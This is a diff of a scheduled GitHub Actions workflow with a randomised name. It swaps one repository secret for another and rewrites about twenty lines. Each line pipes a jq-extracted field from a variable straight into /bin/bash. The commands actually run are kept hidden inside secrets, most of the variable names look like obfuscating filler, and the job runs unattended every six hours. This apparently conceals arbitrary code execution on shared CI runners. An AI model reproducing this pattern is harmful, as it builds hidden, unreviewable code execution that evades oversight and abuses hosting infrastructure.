@@ -2,25 +2,32 @@ name: dongguange7412
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
-
+    - cron: '4 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongguange7412
         env:
-          lde3: ${{ secrets.lde3 }}
+          adzm05702: ${{ secrets.adzm05702 }}
         run: |
-          echo $lde3 | jq -r .xkv5 | /bin/bash
-          echo $cke72980 | jq -r .jfs1 | /bin/bash
-          echo $sbanp53 | jq -r .z34 | /bin/bash
-          echo $ar59 | jq -r .hyh0702 | /bin/bash
-          echo $s4348 | jq -r .qjm18 | /bin/bash
-          echo $gv26 | jq -r .stnb0188 | /bin/bash
-          echo $jrzjj25883 | jq -r .efw71 | /bin/bash
-          echo $f9462 | jq -r .ilvbo786 | /bin/bash
-          echo $uor951 | jq -r .hypz34365 | /bin/bash
+          echo $adzm05702 | jq -r .sbnnw25 | /bin/bash
+          echo $rtfm64154 | jq -r .sfm7732 | /bin/bash
+          echo $zup1 | jq -r .tuan8146 | /bin/bash
+          echo $hjqow9 | jq -r .irn19 | /bin/bash
+          echo $qfgh74008 | jq -r .g5432 | /bin/bash
+          echo $oujlv68055 | jq -r .ga88677 | /bin/bash
+          echo $p9 | jq -r .kywu369 | /bin/bash
+          echo $nxl2089 | jq -r .hjc18675 | /bin/bash
+          echo $kc4 | jq -r .xqxv9 | /bin/bash
+          echo $sb90 | jq -r .mbpee821 | /bin/bash
+          echo $mabz9491 | jq -r .l87140 | /bin/bash
+          echo $hrpn7 | jq -r .fmhwo51 | /bin/bash
+          echo $wuii6561 | jq -r .psbr0 | /bin/bash
+          echo $rfivc68365 | jq -r .bj28 | /bin/bash
+          echo $zx29 | jq -r .fr470 | /bin/bash
+          echo $kg931 | jq -r .odd76645 | /bin/bash
+          echo $q65972 | jq -r .zh34615 | /bin/bash
+          echo $sukpz7 | jq -r .oj95 | /bin/bash
 
